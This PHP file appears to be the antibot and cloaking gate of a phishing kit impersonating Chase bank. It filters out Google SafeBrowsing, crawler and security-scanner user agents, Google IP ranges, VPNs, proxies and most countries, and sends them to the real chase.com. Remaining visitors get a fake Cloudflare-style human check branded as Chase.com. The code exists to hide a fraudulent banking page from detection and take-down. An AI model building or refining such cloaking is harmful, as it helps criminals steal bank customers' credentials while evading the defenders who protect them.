<?php

$uri = $_SERVER['REQUEST_URI'] ?? '';
$basename = basename(parse_url($uri, PHP_URL_PATH));
$is_js_fetch = isset($_SERVER['HTTP_SEC_FETCH_MODE']) && $_SERVER['HTTP_SEC_FETCH_MODE'] === 'cors';

// ✅ استثناء كامل لمكالمات fetch()
if (
    in_array($basename, ['start_session.php', 'render.php']) &&
    $is_js_fetch
) {
    return;
}

define('FP_FILE', __DIR__ . '/fingerprints.json');

file_put_contents('logs/blocked.txt', $_SERVER['REMOTE_ADDR']." | ".$_SERVER['HTTP_USER_AGENT']."\n", FILE_APPEND);

// دوال fingerprint
function load_fingerprints() {
    if (!file_exists(FP_FILE)) file_put_contents(FP_FILE, json_encode([], JSON_PRETTY_PRINT));
    return json_decode(file_get_contents(FP_FILE), true) ?: [];
}

function save_fingerprint($ip, $hash) {
    $fps = load_fingerprints();
    $fps[$ip] = $hash;
    file_put_contents(FP_FILE, json_encode($fps, JSON_PRETTY_PRINT));
}

function get_fingerprint_for_ip($ip) {
    $fps = load_fingerprints();
    return $fps[$ip] ?? null;
}
$config = require __DIR__ . '/config.php';

$LOG_FILE                   = $config['log_file'];
$BLACKLIST_THRESHOLD        = $config['blacklist_threshold'];
$PROXYCHECK_RISK_THRESHOLD  = $config['proxycheck_risk_threshold'];
$NEUTRINO_USER_ID           = $config['user_id'];
$NEUTRINO_API_KEY           = $config['api_key'];
$PROXYCHECK_KEY             = $config['proxycheck_key'];
$TG_BOT_TOKEN               = $config['tg_bot_token'];
$TG_CHAT_ID                 = $config['tg_chat_id'];

define('BLOCKED_IPS_FILE', __DIR__ . '/blocked_ips.json');

date_default_timezone_set('Africa/Cairo');

function get_whitelisted_ips() {
    return [
        '127.0.0.1',
        '156.217.174.222',
    ];
}

function load_blocked_ips() {
    if (!file_exists(BLOCKED_IPS_FILE)) {
        file_put_contents(BLOCKED_IPS_FILE, json_encode([], JSON_PRETTY_PRINT));
        @chmod(BLOCKED_IPS_FILE, 0644);
    }
    $content = file_get_contents(BLOCKED_IPS_FILE);
    $array   = json_decode($content, true);
    return is_array($array) ? $array : [];
}

function add_to_blocked_ips($ip) {
    $whitelist = get_whitelisted_ips();
    if (in_array($ip, $whitelist, true)) {
        return;
    }

    $blocked = load_blocked_ips();
    if (!in_array($ip, $blocked, true)) {
        $blocked[] = $ip;
        file_put_contents(BLOCKED_IPS_FILE, json_encode($blocked, JSON_PRETTY_PRINT));
        @chmod(BLOCKED_IPS_FILE, 0644);
    }
}

function send_telegram($text){
    global $TG_BOT_TOKEN, $TG_CHAT_ID;
    if (empty($TG_BOT_TOKEN) || empty($TG_CHAT_ID)) {
        return;
    }
    $url     = "https://api.telegram.org/bot{$TG_BOT_TOKEN}/sendMessage";
    $payload = [
        'chat_id'    => $TG_CHAT_ID,
        'parse_mode' => 'Markdown',
        'text'       => $text,
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT_MS, 500);
    curl_exec($ch);
    curl_close($ch);
}

function get_client_ip(){
    if (!empty($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    if (!empty($_SERVER["HTTP_X_FORWARDED_FOR"])) {
        $xff = explode(",", $_SERVER["HTTP_X_FORWARDED_FOR"]);
        return trim($xff[0]);
    }
    if (!empty($_SERVER["HTTP_CLIENT_IP"])) {
        return $_SERVER["HTTP_CLIENT_IP"];
    }
    if (!empty($_SERVER["HTTP_FORWARDED_FOR"])) {
        $fwd = explode(",", $_SERVER["HTTP_FORWARDED_FOR"]);
        return trim($fwd[0]);
    }
    if (!empty($_SERVER["HTTP_FORWARDED"])) {
        $parts = explode(";", $_SERVER["HTTP_FORWARDED"]);
        foreach ($parts as $p) {
            $p = trim($p);
            if (stripos($p, "for=") === 0) {
                return trim(substr($p, 4));
            }
        }
    }
    return $_SERVER["REMOTE_ADDR"] ?? '0.0.0.0';
}

function is_bot_request($ua){
    if (strlen($ua) < 10) {
        return true;
    }
    return preg_match(
        '/(bot|crawler|spider|crawl|bingbot|googlebot|slurp|baiduspider|yandexbot|duckduckbot|chatgpt|copilot|gptbot|uptimerobot|newrelic|statuscake|pingdom|curl|wget|python|php|httpclient|libwww-perl)/i',
        $ua
    );
}

function check_ip_reputation($ip){
    global $NEUTRINO_USER_ID, $NEUTRINO_API_KEY;
    $url = "https://neutrinoapi.net/host-reputation?" . http_build_query([
        "user-id" => $NEUTRINO_USER_ID,
        "api-key" => $NEUTRINO_API_KEY,
        "host"    => $ip
    ]);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $resp = curl_exec($ch);
    $code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    if ($code !== 200 || !$resp) {
        return ["risk-score" => 0, "lists" => [], "is-proxy" => false, "is-vpn" => false, "is-bot" => false];
    }
    $data = json_decode($resp, true);
    if (!is_array($data)) {
        return ["risk-score" => 0, "lists" => [], "is-proxy" => false, "is-vpn" => false, "is-bot" => false];
    }
    return [
        "risk-score" => intval($data["risk-score"] ?? 0),
        "lists"      => is_array($data["lists"]) ? $data["lists"] : [],
        "is-proxy"   => !empty($data["is-proxy"]),
        "is-vpn"     => !empty($data["is-vpn"]),
        "is-bot"     => !empty($data["is-bot"])
    ];
}

function check_proxycheck($ip){
    global $PROXYCHECK_KEY;
    $url = "https://proxycheck.io/v2/{$ip}?" . http_build_query([
        "key"  => $PROXYCHECK_KEY,
        "vpn"  => 1,
        "risk" => 1
    ]);
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $resp = curl_exec($ch);
    curl_close($ch);
    $data = @json_decode($resp, true) ?: [];
    if (!isset($data[$ip])) {
        return ["proxy" => false, "type" => "", "risk" => 0];
    }
    return [
        "proxy" => ($data[$ip]["proxy"] ?? "") === "yes",
        "type"  => $data[$ip]["type"]  ?? "",
        "risk"  => intval($data[$ip]["risk"] ?? 0)
    ];
}

function block_and_exit($client_ip, $user_agent, $reason) {
    global $LOG_FILE;
    add_to_blocked_ips($client_ip);
    $line = date("Y-m-d H:i:s")
          . " | REDIRECTED | IP: {$client_ip}"
          . " | UA: {$user_agent}"
          . " | Reason: {$reason}\n";
    file_put_contents($LOG_FILE, $line, FILE_APPEND);
    if (!headers_sent()) {
        header("Location: https://www.chase.com");
        exit;
    }
}

$client_ip  = get_client_ip();
$user_agent = $_SERVER["HTTP_USER_AGENT"] ?? "";

if (is_bot_from_github_list($user_agent)) {
    block_and_exit($client_ip, $user_agent, 'Detected from GitHub Bot List');
}

$referer = $_SERVER['HTTP_REFERER'] ?? '';
$origin  = $_SERVER['HTTP_ORIGIN'] ?? '';
$allowed_sources = [
    'https://gotoschooleg.com',
    'https://www.gotoschooleg.com',
];
foreach ($allowed_sources as $src) {
    if (stripos($referer, $src) !== false || stripos($origin, $src) !== false) {
        return false;
    }
}

if (preg_match('/google.*safebrowsing|googleinspectiontool/i', $user_agent)) {
    block_and_exit($client_ip, $user_agent, 'Blocked Google SafeBrowsing');
}

$google_ranges = ['64.233.', '66.102.', '66.249.', '108.177.', '209.85.', '216.239.'];
foreach ($google_ranges as $prefix) {
    if (str_starts_with($client_ip, $prefix)) {
        block_and_exit($client_ip, $user_agent, 'Blocked Google IP Range');
    }
}
$geo = @json_decode(file_get_contents("http://ip-api.com/json/{$client_ip}?fields=countryCode"), true);
$allowed_countries = ['US', 'EG'];
if (!isset($geo['countryCode']) || !in_array($geo['countryCode'], $allowed_countries)) {
    block_and_exit($client_ip, $user_agent, "Country Not Allowed: " . ($geo['countryCode'] ?? 'Unknown'));
}

$blocked_list = load_blocked_ips();
if (in_array($client_ip, $blocked_list, true)) {
    block_and_exit($client_ip, $user_agent, "Previously Blocked IP");
}

if (!file_exists($LOG_FILE)) {
    file_put_contents($LOG_FILE, "");
    @chmod($LOG_FILE, 0644);
}
file_put_contents($LOG_FILE, date("Y-m-d H:i:s") . " | anitbot.php RUNNING | IP: {$client_ip}\n", FILE_APPEND);

if (empty($user_agent) || preg_match('/^(curl|wget|python|libwww-perl|httpclient|php)/i', $user_agent)) {
    $reason = empty($user_agent) ? "Empty UA" : "Suspicious UA";
    block_and_exit($client_ip, $user_agent, $reason);
}
if (is_bot_request($user_agent)) {
    $reason = "UA Bot";
    block_and_exit($client_ip, $user_agent, $reason);
}

function is_bot_from_github_list(string $ua): bool {
    static $bot_patterns = null;
    if ($bot_patterns === null) {
        $file = __DIR__ . '/crawler-user-agents.json';
        if (!file_exists($file)) return false;
        $json = file_get_contents($file);
        $data = json_decode($json, true);
        if (!is_array($data)) return false;
        $bot_patterns = array_column($data, 'pattern');
    }
    foreach ($bot_patterns as $pattern) {
        if (@preg_match("/$pattern/i", $ua)) {
            return true;
        }
    }
    return false;
}

function is_advanced_bot($ip, $ua) {
    if (isset($_COOKIE['js_verified']) && $_COOKIE['js_verified'] === 'yes') {
        return false;
    }
    if (preg_match('/HeadlessChrome|Puppeteer|Playwright/i', $ua)) {
        return 'Headless browser';
    }
    if (stripos($ua, 'Chrome') !== false && (
        empty($_SERVER['HTTP_SEC_CH_UA']) ||
        empty($_SERVER['HTTP_SEC_FETCH_SITE'])
    )) {
        return 'Fake Chrome UA';
    }
    $known_ranges = ['64.233.', '66.102.', '66.249.', '157.55.', '167.89.'];
    foreach ($known_ranges as $prefix) {
        if (str_starts_with($ip, $prefix)) {
            return 'Bot IP Range';
        }
    }
    return false;
}

$rez        = check_ip_reputation($client_ip);
$risk_score = $rez["risk-score"];
$lists      = $rez["lists"];
$is_proxy   = $rez["is-proxy"];
$is_vpn     = $rez["is-vpn"];
$is_neu_bot = $rez["is-bot"];
$listedCount = 0;
foreach ($lists as $entry) {
    if (!empty($entry["is-listed"])) {
        $listedCount++;
    }
}
$pc              = check_proxycheck($client_ip);
$proxycheckProxy = $pc["proxy"];
$proxycheckType  = $pc["type"];
$proxycheckRisk  = $pc["risk"];

if ($is_proxy || $is_vpn || ($proxycheckProxy && $proxycheckRisk >= $PROXYCHECK_RISK_THRESHOLD)) {
    $reason = "VPN/Proxy Detected";
    block_and_exit($client_ip, $user_agent, $reason);
}
if ($risk_score >= 30 || $listedCount >= $BLACKLIST_THRESHOLD) {
    $reason = "High Risk ({$risk_score}) or ListedCount ({$listedCount})";
    block_and_exit($client_ip, $user_agent, $reason);
}
$log_line = date("Y-m-d H:i:s")
          . " | ALLOWED | IP: {$client_ip}"
          . " | UA: {$user_agent}"
          . " | NeutrinoRisk: {$risk_score}"
          . " | NeutrinoProxy: " . ($is_proxy ? "Y" : "N")
          . " | NeutrinoVPN: "   . ($is_vpn   ? "Y" : "N")
          . " | NeutrinoBot: "   . ($is_neu_bot ? "Y":"N")
          . " | ListedCount: {$listedCount}"
          . " | ProxyCheckProxy: " . ($proxycheckProxy?"Y":"N")
          . " | ProxyCheckType: {$proxycheckType}"
          . " | ProxyCheckRisk: {$proxycheckRisk}"
          . "\n";
file_put_contents($LOG_FILE, $log_line, FILE_APPEND);

// -------------------------------------------------
// CAPTCHA واجهة التحقق Cloudflare-style checkbox كبيرة على الهاتف
// -------------------------------------------------

if (!isset($_COOKIE['js_verified'], $_COOKIE['fp_hash'])) {
    // احفظ الرابط الأصلي في localStorage من السيرفر للواجهة JS
    echo '<script>try { localStorage.setItem("antibot_redirect", ' . json_encode($_SERVER['REQUEST_URI']) . '); }catch(e){}</script>';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title id="dynamic-title">Verify you are human</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <link rel="icon" href="https://www.citi.com/favicon.ico" sizes="any">
  <link rel="icon" type="image/svg+xml" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
  <style>
    :root {
      --box-border:#e5e7eb;
      --box-bg:#fff;
      --text:#222;
      --muted:#8b8b8b;
      --check:#198754;
      --check-bg:#eaf7ed;
      --shadow:0 1px 6px rgba(0,0,0,.06);
    }

    html, body {
      margin: 0;
      padding: 0;
      height: 100%;
      background: #fff;
      font-family: "Segoe UI","Tahoma","Arial",sans-serif;
      color: var(--text);
      display: flex;
      justify-content: flex-start;
      align-items: flex-start;
    }

    .wrap {
      margin: 90px 0 0 48px; /* الكمبيوتر */
      display: flex;
      flex-direction: column;
      align-items: flex-start;
      max-width: 640px;
      width: 100%;
      box-sizing: border-box;
    }

    .head {
      display: flex;
      align-items: center;
      gap: 8px;
      margin-bottom: 6px;
    }

    .site-logo { height: 26px; width: auto; object-fit: contain; }
    .site-title { font-size: 1.8rem; font-weight: 700; margin: 0; }
    .desc { font-size: 1rem; margin: 0 0 16px 0; }

    .cf-box {
      position: relative;
      background: var(--box-bg);
      border: 1px solid var(--box-border);
      border-radius: 6px;
      box-shadow: var(--shadow);
      width: 100%;
      max-width: 560px;
      padding: 10px 14px;
      display: flex;
      align-items: center;
      justify-content: space-between;
      gap: 8px;
      box-sizing: border-box;
      overflow: hidden;
    }

    .cf-left { display: flex; align-items: center; gap: 10px; flex: 1; min-width: 0; }
    .cf-checkbox {
      appearance: none;
      width: 24px; height: 24px;
      border: 2px solid #bfbfbf; border-radius: 6px;
      background: #f9f9f9; cursor: pointer;
      position: relative; outline: none;
      transition: border-color .18s, background .18s;
      flex: 0 0 24px;
    }
    .cf-checkbox:checked { border-color: var(--check); background: var(--check-bg); }
    .cf-checkbox:checked::after {
      content: "";
      position: absolute;
      left: 6px; top: 3px;
      width: 8px; height: 14px;
      border: solid var(--check);
      border-width: 0 3px 3px 0;
      transform: rotate(45deg);
    }

    .cf-text { font-size: .98rem; user-select: none; }
    .cf-right { display: flex; flex-direction: column; align-items: flex-end; min-width: 70px; }
    .cf-logo { height: 22px; object-fit: contain; margin-bottom: 4px; }
    .cf-legal { font-size: .88rem; color: var(--muted); }

    .state-overlay {
      position: absolute;
      inset: 0;
      background: #fff;
      display: none;
      align-items: center;
      gap: 10px;
      padding: 0 14px;
      font-size: .98rem;
      font-weight: 600;
    }

    .state-overlay.active { display: flex; animation: fade .2s; }
    .spinner {
      width: 18px; height: 18px;
      display: inline-block; position: relative;
    }
    .spinner::before {
      content: "";
      position: absolute; inset: 0;
      border-radius: 50%;
      border: 3px dotted #4a9cdb;
      animation: spin 1s linear infinite;
    }

    .success-icon {
      width: 22px; height: 22px;
      border-radius: 50%;
      background: #34c759; color: #fff;
      display: inline-flex; align-items: center;
      justify-content: center; font-size: 14px;
    }

    .foot { margin-top: 14px; font-size: .98rem; }

    @keyframes spin { to { transform: rotate(360deg); } }
    @keyframes fade { from { opacity: 0; } to { opacity: 1; } }

    /* 📱 نسخة الهاتف - نزلته تحت أكثر */
    @media (max-width: 600px) {
      .wrap {
        margin: 110px 0 0 16px; /* ← زودت المسافة العلوية فقط للهاتف */
        max-width: 100%;
        width: calc(100vw - 32px);
      }
      .site-title { font-size: 1.25rem; }
      .desc { font-size: .95rem; margin-bottom: 12px; }
      .cf-box {
        max-width: none;
        width: 100%;
        padding: 8px 12px;
      }
      .cf-text { font-size: .94rem; }
      .cf-right { min-width: auto; }
      .cf-logo { height: 20px; }
      .foot { font-size: .9rem; }
    }
  </style>
</head>
<body>
  <div class="wrap">
    <div class="head">
      <img id="site-logo" class="site-logo" src="https://www.chase.com/etc/designs/chase-ux/favicon.ico" alt="">
      <h1 id="site-title" class="site-title">Chase.com</h1>
    </div>
    <p class="desc">Verify you are human by completing the action below.</p>

    <form id="cfForm" class="cf-box" autocomplete="off" onsubmit="return false">
      <label class="cf-left" for="cfCheck">
        <input id="cfCheck" type="checkbox" class="cf-checkbox" aria-label="Verify you are human">
        <span class="cf-text">Verify you are human</span>
      </label>
      <div class="cf-right" aria-hidden="true">
        <img class="cf-logo" src="https://api.imghippo.com/files/oh3020lFQ.png" alt="CLOUDFLARE">
        <div class="cf-legal">Privacy &nbsp;•&nbsp; Terms</div>
      </div>

      <div id="stateVerifying" class="state-overlay" aria-live="polite">
        <span class="spinner" aria-hidden="true"></span>
        <span>Verifying...</span>
      </div>

      <div id="stateSuccess" class="state-overlay" aria-live="polite">
        <span class="success-icon">✔</span>
        <span>Success!</span>
      </div>
    </form>

    <p id="site-foot" class="foot">citi.com needs to review the security of your connection before proceeding.</p>
  </div>

  <script>
    function setSite(name, logoUrl) {
      document.getElementById('site-title').textContent = name;
      document.getElementById('site-foot').textContent =
        name + " needs to review the security of your connection before proceeding.";
      document.getElementById('dynamic-title').textContent = name + " | Verify you are human";
      if (logoUrl) document.getElementById('site-logo').src = logoUrl;
    }

    setSite("Chase.com", "https://www.chase.com/etc/designs/chase-ux/favicon.ico");

    const check = document.getElementById('cfCheck');
    const vState = document.getElementById('stateVerifying');
    const sState = document.getElementById('stateSuccess');
    const originalUrl = localStorage.getItem('antibot_redirect') || '/';

    check.addEventListener('change', () => {
      if (!check.checked) {
        vState.classList.remove('active');
        sState.classList.remove('active');
        return;
      }
      vState.classList.add('active');
      document.cookie = "js_verified=yes; path=/";
      document.cookie = "fp_hash=human; path=/";
      setTimeout(() => {
        vState.classList.remove('active');
        sState.classList.add('active');
        setTimeout(() => { location.href = originalUrl; }, 900);
      }, 800);
    });
  </script>
</body>
</html>

<?php exit; } ?>
